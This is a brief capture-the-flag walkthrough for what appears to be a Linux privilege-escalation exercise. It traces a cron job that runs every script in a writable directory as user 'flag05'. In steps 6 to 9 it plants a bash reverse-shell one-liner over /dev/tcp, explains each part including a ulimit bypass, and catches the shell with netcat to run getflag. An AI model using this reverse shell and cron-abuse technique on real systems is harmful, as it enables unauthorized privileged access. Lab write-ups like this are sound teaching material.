1.	We receive notification "You have new mail."

2.	Do `find / -name "mail" 2>/dev/null` ==	/usr/lib/byobu/mail and /var/mail

3.	`cat /usr/lib/byobu/mail` == script that checks mail in a specific file
4.	`cat /var/mail` == cron schedule that executes a script located at /usr/sbin/openarenaserver logged as user 'flag05', every 2 minutes

5.	`cat /usr/sbin/openarenaserver` == a script that loops inside directory /opt/openarenaserver/, it executes each file as a script.

6.	write a script at /opt/openarenaserver/ --> `bash -i >& /dev/tcp/0.0.0.0/5050 0>&1` this opens a REVERSE SHELL.<br>
	explained:<br>
	- `bash -i` == opens an interactive shell<br>
	- `>& /dev/tcp/0.0.0.0/5050` == redirects all outputs to a TCP connection<br>
	- `0>&1` == redirects stdin to stdout, important to be able to input commands AND bypass ulimit -t 5<br>

8.	SSH connect to VM with another terminal, netcat on specified port (5050 in this case)

9.	wait for cron schedule to execute and open a reverse shell (MUST WAIT FOR CRON SCHEDULE TO EXECUTE OUR SCRIPT TO HAVE PRIVILEGES INSIDE REVERSE SHELL)

10.	use getflag inside the reverse shell
